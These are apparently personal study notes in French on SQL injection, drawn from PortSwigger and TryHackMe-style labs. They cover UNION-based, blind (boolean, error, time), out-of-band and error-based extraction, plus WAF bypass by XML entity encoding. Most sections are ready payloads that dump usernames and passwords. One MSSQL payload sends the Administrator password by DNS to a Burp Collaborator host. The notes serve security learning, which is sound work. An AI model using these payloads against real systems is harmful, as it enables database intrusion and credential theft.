```toc

```

Ressources :
- SQLi cheatsheet : https://portswigger.net/web-security/sql-injection/cheat-sheet


Lorsqu'une entrée utilisateur est incluse dans une requête SQL sans précaution, il est possible de détourner la requête SQL.

Requête normale et requête SQL associée : 
```sql
-- GET https://website/login?username=paul&password=123
SELECT user WHERE username='paul' AND password='123'
```
Requête malveillante (le mdp n'est pas vérifié) et requêtes SQL associées :
```sql
-- GET https://website/login?username=paul';--&password=osef
SELECT user WHERE username='paul';--'' AND password='osef'

-- GET https://website/login?username=paul&password=osef' OR 1=1
SELECT user WHERE username='paul' AND password='osef' OR 1=1
```

On commence par trouver un input vulnérable (en regardant les erreurs ou directement le résultat du serveur).
Tips : `;` termine une commande SQL, `--` met en commentaire la suite.


# Détecter une SQLi
Checklist à vérifier sur tous les inputs utilisateur (url, formulaire, ...):
- Mettre une apostrophe `'`
- `OR 1=1` et `OR 1=2` pour identifier des réponses différentes du serveur
- Des payloads entraînant un délai de traitement (`sleep`)
- Des payloads pour créer une connexion réseau sur un endpoint que l'on contrôle



# UNION based SQLi
## Déterminer le nombre de colonnes
Pour que l'UNION fonctionne il faut que les 2 côté de l'union ait le même nombre de colonnes (et que les données retournées dans chaque duo de colonnes soit du même type), sinon on aura une erreur.
Pour le déterminer, on procède itérativement :
```SQL
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

On peut obtenir le même résultat en faisant :
```sql
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--
```

## Identifier une colonne de type string
Ensuite, on identifie une colonne qui nous permettra de récupérer des informations utiles (à la place des `NULL`) et donc qui soit compatible avec une chaîne de caractère.
Par exemple, avec 3 colonnes :
```sql
' UNION SELECT 'a', NULL, NULL--
' UNION SELECT NULL, 'a', NULL--
' UNION SELECT NULL, NULL, 'a'--
```

## Identifier la structure des tables
Supposons que 3 colonnes soient renvoyées et que la dernière soit une string.
Maintenant, on veut récupérer des informations sur la db, le nom des tables, etc. Voici un exemple pour **MySQL**.
```sql
-- Vérifie qu'il s'agit bien de MySQL
'' UNION SELECT NULL, NULL, @@version

-- Donne le nom de la db actuelle
'' UNION SELECT NULL, NULL, database()

-- Liste les tables de la bd <db_name>
'' UNION SELECT NULL, NULL, group_concat(table_name) FROM information_schema.tables WHERE table_schema='<db_name>'

-- Liste les colonnes de la table <table_name>
'' UNION SELECT NULL, NULL, group_concat(column_name) FROM information_schema.columns WHERE table_name='<table_name>'
```

La même logique s'applique pour les autres type de db (**MySQL**, **Oracle**, **PostgreSQL** et **Microsoft**) mais avec des syntaxes différentes : https://portswigger.net/web-security/sql-injection/cheat-sheet

Pour MySQL, PostegreSQL et Microsoft les lignes suivantes fonctionnent (cas simple où on peut renvoyer plusieurs lignes en sortie, donc pas besoin de `group_concat` ou équivalent).
```sql
-- Donne le nom de toutes les tables
'' UNION SELECT NULL, NULL, table_name FROM information_schema.tables--

-- Liste les colonnes de la table <table_name>
'' UNION SELECT NULL, NULL, column_name FROM information_schema.columns WHERE table_name='<table_name>'
```
## Exfiltrer des données
A partir de là, on a toutes les informations nécessaires sur la structure des tables et on peut exfiltrer les données souhaitées.
```sql
-- Récupération d'une ligne
'' UNION SELECT NULL, NULL, password FROM staff_users WHERE username='martin' 

-- Récupération de toutes les lignes
'' UNION SELECT NULL, NULL, group_concat(username, ':', password SEPARATOR '<br>') FROM staff_users
```


# Blind SQLi
## Boolean blind SQLi
Dans ce cas, la seule information que renvoie le serveur sur l'entrée vulnérable est un booléen.
Par exemple, l'API `https://website.thm/checkuser?username=admin` renvoie vrai si le nom admin est déjà pris et faux sinon. Si cet API est vulnérable, alors elle renverra vrai si la requête SQL sous-jacente est vraie.

On peut alors reprendre la méthode précédente basée sur les UNION, mais avec plus de patience.
```sql
-- On identifie qu'il y a 3 colonnes renvoyées (la requête suivante renvoie True)
'' UNION SELECT NULL, NULL, NULL;-- 

-- On identifie le nom de la db en utilisant 'like'
'' UNION SELECT NULL, NULL, NULL WHERE database() like 'a%';--       Renvoie True si le nom commence par 'a'
'' UNION SELECT NULL, NULL, NULL WHERE database() like 'at%';--       Renvoie True si le nom commence par 'at'
...

-- Idem avec le nom des tables
'' UNION SELECT NULL, NULL, NULL FROM information_schema.tables WHERE table_schema = '<db_name>' and table_name like 'a%';--

-- Idem pour le nom des colonnes
'' UNION SELECT NULL, NULL, NULL FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';--

-- Finalement, on extrait ce que l'on souhaite de la même façon
'' UNION SELECT NULL, NULL, NULL from users where username='admin' and password like 'a%';--
```

**Note :** au lieu d'utiliser `like`, on peut comparer si un caractère est inférieur ou supérieur à un autre, ça permet de faire une recherche dichotomique, ce qui est plus rapide :
```SQL
'' UNION SELECT NULL, NULL, NULL WHERE SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm';--`
```

Autre exemple :
On a un cookie de session `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`, et le serveur fait la requête SQL : `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`.
On peut alors faire un SQLi, mais on ne verra pas la réponse. Malgré tout, le serveur se comporte différemment selon si la requête fonctionne ou non.
=> On peut donc faire une blind SQLi.
cf [[Blind SQLi script]]

## Error based blind SQLi
Parfois, le comportement de l'application ne change pas en fonction du résultat de la requête, mais il diffère si la requête entraîne une erreur renvoyée par la db. L'erreur ne nous ait pas forcément renvoyée mais elle cause une différence de comportement dans l'application.
=> On va pouvoir reprendre la même démarche que en blind SQLi mais en créant des erreurs conditionnellement cette fois.
```SQL
'' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```
Dans le premier cas, l'expression `CASE` vaut `'a'` ce qui ne cause pas de problème, tandis que dans le second, elle vaut `1/0` ce qui cause une erreur.

On peut alors créer des payloads telles que :
```SQL
'' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

Ou, pour une base de données **Oracle** :
```SQL
'' AND (SELECT CASE WHEN (SUBSTR(password,1,1) > 'm') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
```
Selon le type de db (MySQL, Oracle, Microsoft, PostgreSQL), la syntaxe et les erreurs à utilisées changent, cf : https://portswigger.net/web-security/sql-injection/cheat-sheet.

## Time based blind SQLi
Ici, aucune information n'est renvoyé à l'utilisateur. La seule façon de confirmer qu'une injection SQL est possible est en ajoutant un délai conditionnel dans la requête, et si l'injection se passe correctement, la réponse aura 5s de délai par exemple.
Cela fonctionne uniquement si la requête SQL est faite de manière synchrone et donc le serveur attend la fin de la requête SQL avant de répondre.

La démarche est la même que les autres blind SQLi. On peut identifier le point d'entrée avec les concaténation suivante : 
```sql
--MySQL (string concat and logical ops)
'xyz' + sleep(10)
'xyz' and sleep(10)
'xyz' && sleep(10)
'xyz' | sleep(10)

--PostgreSQL (only support string concat)
'xyz' || pg_sleep(10)

--MSQL
'xyz' WAITFOR DELAY '0:0:10'

--Oracle
'xyz' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('RDM',10)

--SQLite
'xyz' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```

Ce qui donne ensuite pour **PostgreSQL** :
```SQL
-- Simple
'xyz' || SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END

-- Complet
'xyz' || (SELECT CASE WHEN (username='administrator' AND SUBSTRING(password, 1, 1) > '!') THEN pg_sleep(2) ELSE pg_sleep(0) END FROM users)
```

## Out-of-band blind SQLi
Imaginons à présent que la requête SQL faite à la db soit asynchrone : le temps de réponse du serveur ne dépend donc plus de temps de traitement de la requête SQL.
On peut tenter d'utiliser un autre canal pour savoir si la SQLi a reussie ou échoué en déclenchant une requête réseau à un composant que l'on contrôle, par exemple une requête DNS.

On peut facilement obtenir un sous-domaine utilisable DNS pour des tests avec des outils tels que : https://webhook.site.

Exemple de payload sur Microsoft SQL :
```SQL
''; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.burpcollaborator.net/a"')--
```
La syntaxe dépend du moteur SQL (MySQL, PostgreSQL, ...).

**Note :** les out-of-band SQLi sont très performantes car elles permettent d'exfiltrer des données directement sans avoir à deviner un caractère à la fois, et elles fonctionnent souvent lorsqu'une autre sorte de blind SQLi fonctionne (cela dépend des restrictions réseau).


# Exfiltration de données via des erreurs
Si lorsqu'une requête est mal formée, l'erreur est renvoyée à l'utilisateur, alors on peut :
1. Mieux comprendre comment la requête est faite et réaliser une SQLi
2. Créer volontairement une erreur qui renverra le résultat d'une partie de la requête SQL

La deuxième option permet d'exfiltrer des résultats SQL et d'éviter de devoir réaliser une blind SQLi.
Pour ce faire, on peut typiquement utiliser la fonction `CAST`:
```SQL
CAST((SELECT example_column FROM example_table) AS int)
```
Le résultat de la requête `SELECT` est une chaîne de caractères, ce qui causera une erreur lorsqu'on essaiera de le convertir en int.
On obtient alors une erreur comme : `ERROR: invalid input syntax for type integer: "Example data"`, qui nous révèle le résultat de notre requête.


# Contourner les filtres et WAF
Pour les filtres les plus simples, il suffit d'encoder les caractères des mots probablement interdits (ex : `SELECT`). Les types d'encodage utilisables dépendent du point d'entrée : URL, XML, ...

Exemple, dans un champ XML, l'encodage suivant permet deontourner les filtres sur `SELECT`, `UNION`, `'` et `--` : 
```SQL
&#85;&#78;&#73;&#79;&#78; &#83;&#69;&#76;&#69;&#67;&#84; password FROM users WHERE username=&#39;administrator&#39;&#45;&#45;
```
La requête exécutée est : `UNION SELECT password FROM users WHERE username='administrator'--`


# Second-order SQLi
Parfois, l'entrée utilisateur est traité correctement et est enregistré dans la base de données, puis dans un second temps, cette donnée enregistrée est à nouveau manipulée mais sans les précaution d'emploi nécessaire.
On parle alors de second-order SQLi ou de SQLi stockée.
